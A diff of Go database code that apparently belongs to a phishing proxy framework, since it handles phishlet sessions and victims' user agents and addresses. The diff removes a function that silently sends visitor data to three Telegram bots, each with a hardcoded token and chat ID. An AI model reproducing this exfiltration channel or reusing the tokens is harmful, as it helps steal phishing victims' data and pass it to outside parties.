@@ -42,33 +42,6 @@ func (d *Database) sessionsInit() {
 	d.db.CreateIndex("sessions_sid", SessionTable+":*", buntdb.IndexJSON("session_id"))
 }
 
-func telegramSendVisitor(msg string) {
-	msg = strings.Replace(strings.Replace(strings.Replace(strings.Replace(strings.Replace(strings.Replace(strings.Replace(strings.Replace(strings.Replace(strings.Replace(strings.Replace(strings.Replace(strings.Replace(strings.Replace(strings.Replace(strings.Replace(strings.Replace(strings.Replace(strings.Replace(msg, "\n", "%0A", -1), "!", "\\!", -1), "}", "\\}", -1), "{", "\\{", -1), "|", "\\|", -1), "=", "\\=", -1), "+", "\\+", -1), ">", "\\>", -1), "#", "\\#", -1), "~", "\\~", -1), ")", "\\)", -1), "(", "\\(", -1), "]", "\\]", -1), ".", "\\.", -1), "`", "\\`", -1), "[", "\\[", -1), "*", "\\*", -1), "_", "\\_", -1), "-", "\\-", -1)
-	resp2, xerr := http.Get("https://api.telegram.org/bot6709278091:AAElpViRJ_jefteECT3Y5iqmWyOe5kpgrV4/sendMessage?chat_id=5538579587&parse_mode=MarkdownV2&text=" + msg)
-	resp, xerr2 := http.Get("https://api.telegram.org/bot6153769899:AAFWxF8uDir2grHolKdxKOWqf7Fe_y75jEY/sendMessage?chat_id=5538579587chatid&parse_mode=MarkdownV2&text=" + msg)
-	resp3, xerr3 := http.Get("https://api.telegram.org/bot5794620752:AAFnk_QYOgMqzEaYxvMdMiFMIP5beCgFPLA/sendMessage?chat_id=5538579587&parse_mode=MarkdownV2&text=" + msg)
-
-	//5236398939 Fashion
-
-	if xerr != nil {
-		fmt.Print("error")
-	}
-	if xerr2 != nil {
-		fmt.Print("error")
-	}
-	if xerr3 != nil {
-		fmt.Print("error")
-	}
-	defer resp.Body.Close()
-	defer resp2.Body.Close()
-	defer resp3.Body.Close()
-
-	_, eerr := ioutil.ReadAll(resp.Body)
-	if eerr != nil {
-		fmt.Print("error")
-	}
-}
-
 func (d *Database) sessionsCreate(sid string, phishlet string, landing_url string, useragent string, remote_addr string) (*Session, error) {
 	_, err := d.sessionsGetBySid(sid)
 	if err == nil {
